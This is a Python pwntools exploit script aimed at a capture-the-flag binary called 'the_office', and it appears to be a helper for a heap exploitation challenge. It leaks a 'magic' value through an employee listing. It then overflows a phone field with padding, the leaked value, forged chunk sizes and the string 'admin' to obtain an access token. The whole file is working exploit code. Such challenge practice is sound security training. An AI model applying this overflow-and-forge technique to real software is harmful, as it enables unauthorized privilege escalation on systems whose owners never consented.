import sys, re, struct
sys.path.insert(0, "/mnt/d/ctf-index")
from pwn import context, process
context.log_level = "error"

sys.argv = ["x", "local"]
import importlib.util
spec = importlib.util.spec_from_file_location("ex", "/mnt/d/ctf-index/_z_172_exploit.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ex)

io = process("./the_office")
io.recvuntil(b"4) Get access token")
ex.add(io, b"A", email=b"a" * 28)
ex.remove(io, 0)
ex.add(io, b"B", salary=2000, phone=b"222")
ex.add(io, b"C", salary=3000, phone=b"333")
out = ex.listemps(io)
magic = int(re.findall(r"Bldg #: (\d+)", out.decode("latin-1"))[-1])
print("magic = 0x%08x" % magic)
ex.remove(io, 0)
payload = b"A" * 28 + struct.pack("<I", magic) + struct.pack("<I", 0x35) * 2 + b"admin\x00"
ex.add(io, b"D", salary=4000, phone=payload)
out = ex.listemps(io)
print("=== apres overflow ===")
print(out.decode("latin-1"))
io.sendline(b"4")
import time
time.sleep(0.5)
try:
    print("=== access token ===")
    print(io.recv(timeout=3).decode("latin-1"))
except Exception as e:
    print("ERR", e)
io.close()
